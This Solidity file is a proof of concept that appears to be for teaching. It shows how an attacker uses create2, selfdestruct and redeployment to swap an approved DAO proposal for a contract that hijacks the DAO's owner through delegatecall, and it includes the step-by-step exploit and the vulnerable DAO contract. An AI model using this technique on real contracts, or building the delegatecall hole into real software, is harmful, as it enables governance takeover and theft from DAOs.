// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Called by Alice
0. Deploy DAO

Called by Attacker
1. Deploy DeployerDeployer
2. Call DeployerDeployer.deploy()
3. Call Deployer.deployProposal()

Called by Alice
4. Get DAO approval of Proposal

Called by Attacker
5. Delete Proposal and Deployer
6. Re-deploy Deployer
7. Call Deployer.deployAttack()
8. Call DAO.execute
9. Check DAO.owner is attacker's address

DAO -- approved --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Attack
*/

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(
            Proposal({target: target, approved: true, executed: false})
        );
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok,) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint256(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
